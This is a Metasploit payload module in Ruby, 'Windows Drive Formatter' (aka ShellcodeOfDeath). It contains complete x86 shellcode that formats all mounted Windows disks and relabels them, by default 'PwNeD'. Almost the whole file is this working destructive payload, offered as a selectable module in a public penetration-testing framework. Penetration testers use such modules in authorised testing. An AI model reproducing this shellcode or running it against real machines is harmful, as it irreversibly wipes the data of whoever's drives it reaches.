##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#   Shellcode Of Death
#
#   Test bed:
#        x86: Windows XP SP3, Windows 2003 SP2, Windows 7
#        x64: Windows 8.1
#
###

module MetasploitModule

  CachedSize = 393

  Rank = ManualRanking

  include Msf::Payload::Windows
  include Msf::Payload::Single

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Drive Formatter',
      'Description'   => %q{
        This payload formats all mounted disks in Windows (aka ShellcodeOfDeath).

        After formatting, this payload sets the volume label to the string specified in
        the VOLUMELABEL option. If the code is unable to access a drive for any reason,
        it skips the drive and proceeds to the next volume.
      },
      'Author'        => [ 'Ashfaq Ansari <ashfaq_ansari1989[at]hotmail.com>',
                         'Ruei-Min Jiang <mike820324[at]gmail.com>'
                        ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          [ 'URL', 'http://hacksys.vfreaks.com/research/shellcode-of-death.html' ],
          [ 'URL', 'https://github.com/hacksysteam/ShellcodeOfDeath' ],
        ],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Privileged'    => true,
      ))

    # EXITFUNC is not supported
    deregister_options('EXITFUNC')

    # Register command execution options
    register_options(
      [
        OptString.new('VOLUMELABEL', [ false, "Set the volume label", "PwNeD" ])
      ])
  end

  def generate

    volume_label   = datastore['VOLUMELABEL'] || ""
    encoded_volume_label = volume_label.to_s.unpack("C*").pack("v*")

    # Calculate the magic key
    magic_key    = encoded_volume_label.length + 28

    # Actual payload
    payload_data =  "\xeb\x5a\x31\xc0\x8b\x34\x83\x01\xd6\x53\x50\x31\xdb\x31\xc0\xac\xc1\xc3\x05\x01\xc3\x83" +
            "\xf8\x00\x75\xf3\xc1\xcb\x05\x39\xcb\x58\x5b\x74\x03\x40\xeb\xde\xc3\x89\xd0\x8b\x40\x3c" +
            "\x8b\x44\x02\x78\x8d\x04\x02\x50\x8b\x40\x20\x8d\x1c\x02\xe8\xc3\xff\xff\xff\x5b\x8b\x4b" +
            "\x24\x8d\x0c\x0a\x66\x8b\x04\x41\x25\xff\xff\x00\x00\x8b\x5b\x1c\x8d\x1c\x1a\x8b\x04\x83" +
            "\x8d\x04\x02\xc3\x31\xc9\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x1c\x8b\x50\x08\x8b" +
            "\x78\x20\x8b\x00\x3a\x4f\x18\x75\xf3\x68\x64\x5b\x02\xab\x68\x10\xa1\x67\x05\x68\xa7\xd4" +
            "\x34\x3b\x68\x96\x90\x62\xd7\x68\x87\x8f\x46\xec\x68\x06\xe5\xb0\xcf\x68\xdc\xdd\x1a\x33" +
            "\x89\xe5\x6a\x07\x59\x31\xff\x83\xf9\x01\x75\x0c\x51\xeb\x1c\x8b\x44\x24\x1c\xff\xd0\x89" +
            "\xc2\x59\x51\x8b\x4c\xbd\x00\xe8\x6b\xff\xff\xff\x59\x50\x47\xe2\xe0\x89\xe5\xeb\x0f\xe8" +
            "\xdf\xff\xff\xff\x66\x6d\x69\x66\x73\x2e\x64\x6c\x6c\x00\xeb\x7e\x5e\x6a\x17\x59\x89\xcf" +
            "\x31\xd2\x52\x52\x6a\x03\x52\x6a\x03\x68\x00\x00\x00\xc0\x56\x8b\x5d\x14\xff\xd3\x50\x83" +
            "\xec\x04\x31\xd2\x52\x8d\x5c\x24\x04\x53\x52\x52\x52\x52\x68\x20\x00\x09\x00\x50\x8b\x5d" +
            "\x08\xff\xd3\xff\x74\x24\x04\x8b\x5d\x0c\xff\xd3\x8d\x86" +
            # You need to adjust this. Logic: encoded_volume_label.length + 28
            [magic_key].pack("C") +
            "\x00\x00\x00\x50\x68\x00\x10\x00\x00\x6a\x01\x8d\x86\x1a\x00\x00\x00\x50\x8d\x86\x10\x00" +
            "\x00\x00\x50\x6a\x0c\x8d\x46\x08\x50\x8b\x5d\x00\xff\xd3\x68\xc8\x00\x00\x00\x8b\x5d\x04" +
            "\xff\xd3\x89\xf9\x83\x46\x08\x01\xe2\x8d\x6a\x00\x8b\x5d\x10\xff\xd3\xe8\x7d\xff\xff\xff" +
            "\x5c\x00\x5c\x00\x2e\x00\x5c\x00\x43\x00\x3a\x00\x5c\x00\x00\x00\x4e\x00\x54\x00\x46\x00" +
            "\x53\x00\x00\x00" +
            # Volume Label, default: PwNeD
            encoded_volume_label +
            "\x00\x00\x55\x89\xe5\x31\xc0\x40\x5d\xc2\x0c\x00"
  end
end
